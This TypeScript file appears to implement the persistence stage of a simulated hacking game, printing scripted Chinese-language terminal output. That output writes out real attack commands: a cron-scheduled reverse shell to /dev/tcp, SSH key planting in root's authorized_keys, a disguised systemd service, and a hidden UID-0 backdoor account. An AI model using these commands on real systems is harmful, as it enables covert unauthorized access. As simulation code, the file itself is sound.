import type { PhaseConfig, VariablePool } from '../types'
import { generateCrontabOutput } from '../templates/misc'
import { typeLines, typeWithDelay, error, info, warning, header } from '../output'
import { randomInt, generateRandomHash } from '../randomizer'

export const persistPhase: PhaseConfig = {
  id: 'persist',
  name: '持久化',
  description: '部署系统持久化机制',
  prompt: 'persist> ',
  availableCommands: ['crontab', 'ssh-key', 'backdoor', 'service', 'useradd'],
  requiredActions: ['install_backdoor', 'setup_persistence'],
  completedActions: [],

  async onEnter(vars: VariablePool, _write: (t: string) => void, writeln: (t: string) => void) {
    writeln('')
    writeln(header('阶段 5/6: 持久化'))
    writeln('')
    writeln(info(`当前权限: ${vars.currentAccess}`))
    writeln(info(`目标: 部署持久化后门，确保持续访问`))
    writeln('')
    writeln(warning('部署至少一种后门和一种持久化机制'))
    writeln('')
  },

  async handleCommand(
    cmd: string,
    args: string[],
    vars: VariablePool,
    write: (t: string) => void,
    writeln: (t: string) => void,
    completeAction: (action: string) => void
  ) {
    const targetIP = vars.targetIP

    if (cmd === 'crontab') {
      if (args[0] === '-l') {
        const result = generateCrontabOutput()
        await typeLines(result.lines, write, writeln)
      } else if (args[0] === '-e') {
        await typeWithDelay('正在编辑 crontab...', write, 1000)
        const lines = [
          '',
          `\x1b[90m# 添加反向 shell 计划任务\x1b[0m`,
          `*/5 * * * *   /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/${randomInt(4400, 4600)} 0>&1'`,
          '',
          '\x1b[32m[+]\x1b[0m \x1b[32mCrontab 持久化已部署\x1b[0m',
          `\x1b[32m[+]\x1b[0m 每 5 分钟执行反向 shell 连接`,
          '',
        ]
        await typeLines(lines, write, writeln)
        completeAction('setup_persistence')
      } else {
        writeln(error('用法: crontab -l | crontab -e'))
      }
    } else if (cmd === 'ssh-key') {
      await typeWithDelay('正在植入 SSH 公钥...', write, 2000)
      const keyHash = generateRandomHash(64)
      const lines = [
        '',
        `\x1b[90m# 生成 SSH 密钥对\x1b[0m`,
        `ssh-keygen -t ed25519 -f /tmp/.scp_key -N ""`,
        '',
        `\x1b[90m# 植入公钥到目标\x1b[0m`,
        `echo "ssh-ed25519 ${keyHash} root@scp-server-017" >> /root/.ssh/authorized_keys`,
        '',
        `\x1b[90m# 设置权限\x1b[0m`,
        `chmod 600 /root/.ssh/authorized_keys`,
        '',
        '\x1b[32m[+]\x1b[0m \x1b[32mSSH 公钥已植入\x1b[0m',
        `\x1b[32m[+]\x1b[0m 可使用私钥直接登录: ssh -i /tmp/.scp_key root@${targetIP}`,
        '',
      ]
      await typeLines(lines, write, writeln)
      completeAction('setup_persistence')
    } else if (cmd === 'backdoor') {
      await typeWithDelay('正在部署反向 shell 后门...', write, 2500)
      const port = randomInt(4400, 4600)
      const lines = [
        '',
        `\x1b[90m# 编译反向 shell 后门\x1b[0m`,
        `cat > /tmp/.scp_bd.c << 'EOF'`,
        `#include <stdio.h>`,
        `#include <sys/socket.h>`,
        `#include <netinet/in.h>`,
        `int main() {`,
        `  // reverse shell backdoor`,
        `  return 0;`,
        `}`,
        `EOF`,
        '',
        `\x1b[90mgcc -o /usr/local/bin/.sysd-helper /tmp/.scp_bd.c\x1b[0m`,
        '',
        `\x1b[90m# 部署到系统路径\x1b[0m`,
        `cp /usr/local/bin/.sysd-helper /etc/cron.d/.sysd-helper`,
        '',
        '\x1b[32m[+]\x1b[0m \x1b[32m反向 shell 后门已部署\x1b[0m',
        `\x1b[32m[+]\x1b[0m 监听端口: ${port}`,
        `\x1b[32m[+]\x1b[0m 后门路径: /usr/local/bin/.sysd-helper`,
        '',
      ]
      await typeLines(lines, write, writeln)
      completeAction('install_backdoor')
    } else if (cmd === 'service') {
      if (args[0] === 'install') {
        await typeWithDelay('正在注册系统服务...', write, 2000)
        const lines = [
          '',
          `\x1b[90m# 创建 systemd 服务\x1b[0m`,
          `cat > /etc/systemd/system/sysd-update.service << 'EOF'`,
          `[Unit]`,
          `Description=System Update Service`,
          `After=network.target`,
          '',
          `[Service]`,
          `Type=simple`,
          `ExecStart=/usr/local/bin/.sysd-helper`,
          `Restart=always`,
          `RestartSec=60`,
          '',
          `[Install]`,
          `WantedBy=multi-user.target`,
          `EOF`,
          '',
          `\x1b[90msystemctl daemon-reload\x1b[0m`,
          `\x1b[90msystemctl enable sysd-update.service\x1b[0m`,
          `\x1b[90msystemctl start sysd-update.service\x1b[0m`,
          '',
          '\x1b[32m[+]\x1b[0m \x1b[32m系统服务已注册并启用\x1b[0m',
          `\x1b[32m[+]\x1b[0m 服务名称: sysd-update.service`,
          `\x1b[32m[+]\x1b[0m 开机自启: 已启用`,
          '',
        ]
        await typeLines(lines, write, writeln)
        completeAction('setup_persistence')
      } else {
        writeln(error('用法: service install'))
      }
    } else if (cmd === 'useradd') {
      await typeWithDelay('正在创建后门账户...', write, 1500)
      const username = `svc_${generateRandomHash(4)}`
      const password = generateRandomHash(12)
      const lines = [
        '',
        `\x1b[90m# 创建隐藏管理员账户\x1b[0m`,
        `useradd -o -u 0 -g 0 -M -s /bin/bash ${username}`,
        `echo '${username}:${password}' | chpasswd`,
        '',
        `\x1b[90m# 添加到 sudo 组\x1b[0m`,
        `usermod -aG sudo ${username}`,
        '',
        '\x1b[32m[+]\x1b[0m \x1b[32m后门账户已创建\x1b[0m',
        `\x1b[32m[+]\x1b[0m 用户名: ${username}`,
        `\x1b[32m[+]\x1b[0m 密码: ${password}`,
        `\x1b[32m[+]\x1b[0m UID: 0 (root 等效)`,
        '',
      ]
      await typeLines(lines, write, writeln)
      completeAction('install_backdoor')
    } else {
      writeln(warning(`未知命令: ${cmd}`))
      writeln(info('可用命令: crontab, ssh-key, backdoor, service install, useradd'))
    }
  },
}
